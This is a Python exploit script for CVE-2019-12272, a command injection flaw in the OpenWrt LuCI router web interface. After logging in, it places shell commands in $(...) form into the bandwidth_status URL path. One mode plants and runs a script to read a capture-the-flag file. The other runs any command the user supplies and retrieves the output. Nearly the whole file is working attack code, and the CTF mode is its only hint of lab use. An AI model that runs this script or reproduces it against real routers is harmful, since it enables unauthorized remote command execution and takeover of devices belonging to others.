#!/usr/bin/python3

import argparse
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def catch_the_flag(address, username, password):
    session = requests.Session()

    # 构造POST请求的URL
    login_url = f'http://{address}/cgi-bin/luci'
    data = {'luci_username': username, 'luci_password': password}
    session.post(url=login_url, data=data, verify=False)

    # 构造执行命令的URL，并使用subprocess模块来执行命令
    exec_url_1 = f'http://{address}/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(echo%20cd%20..>flag.sh)'
    exec_url_2 = f'http://{address}/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(echo%20tail%20flag>>flag.sh)'
    exec_url_3 = f'http://{address}/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$(ash%20flag.sh>flag)'

    session.get(url=exec_url_1, verify=False)
    session.get(url=exec_url_2, verify=False)
    session.get(url=exec_url_3, verify=False)

    flag_url = f'http://{address}/flag'
    response = session.get(flag_url)
    flag = response.text

    if response.status_code == 200:
        print('[+] ' + flag)
    else:
        print(
            f'[-] Failed to catch the flag. Status code: {response.status_code}')


def exploit(address, username, password, command):
    session = requests.Session()

    # 构造POST请求的URL
    login_url = f'http://{address}/cgi-bin/luci'
    data = {'luci_username': username, 'luci_password': password}
    session.post(url=login_url, data=data, verify=False)

    # 构造执行命令的URL
    exec_url = f'http://{address}/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0$({command}>output)'
    session.get(url=exec_url, verify=False)

    output_url = f'http://{address}/output'
    output = session.get(url=output_url, verify=False)

    if output.status_code == 200:
        print('>>' + output.text)
    else:
        print(
            f'[-] Failed to execute command. Status code: {output.status_code}')


def main():
    parser = argparse.ArgumentParser(description='cve-2019-12272.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument(
        '-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument(
        '-u', '--username', help='username', required=True)
    requiredNamed.add_argument(
        '-p', '--password', help='password', required=True)
    parser.add_argument('-c', '--command', help='Command to inject')

    args = parser.parse_args()

    if args.command is None:
        catch_the_flag(args.address, args.username, args.password)
    else:
        exploit(args.address, args.username, args.password, args.command)


if __name__ == "__main__":
    main()
